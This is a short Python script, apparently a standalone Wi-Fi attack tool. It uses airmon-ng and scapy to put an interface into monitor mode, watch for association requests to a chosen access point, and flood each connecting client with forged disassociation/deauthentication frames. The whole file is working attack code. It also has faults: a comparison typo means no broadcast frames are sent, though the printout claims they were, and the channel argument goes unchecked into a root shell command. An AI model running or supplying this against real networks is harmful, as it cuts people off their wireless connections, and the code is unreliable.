#!/usr/bin/env python

import sys,subprocess
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp, sniff, conf

chan=sys.argv[1]
bssid=sys.argv[2]

subprocess.run("sudo airmon-ng check kill > /dev/null", shell=True, executable="/bin/bash")
subprocess.run("sudo airmon-ng start wlan0 > /dev/null", shell=True, executable="/bin/bash")
change_channel="sudo iwconfig wlan0 channel "+chan
subprocess.run(change_channel, shell=True, executable="/bin/bash")

def Process_AssocReq(packet):
	if packet.haslayer(Dot11) and (packet.type == 0 and packet.subtype ==0 and packet.addr1.casefold() == bssid.casefold()):
		deauth_frame=RadioTap()/Dot11(type=0,subtype=10,addr1=packet.addr2,addr2=packet.addr1,addr3=packet.addr1)/Dot11Deauth(reason=3)
		
		s=conf.L2socket(iface='wlan0')
		for i in range(1,100):
			s.send(deauth_frame)
		
		deauth_frame.addr1=='ff:ff:ff:ff:ff:ff'
		for i in range(1,100):  
                        s.send(deauth_frame)
		
		print('Association Request found and 100 broadcast and directed deauth frames injected toward client --> '+deauth_frame.addr1)
	

sniff(iface='wlan0',prn=Process_AssocReq)

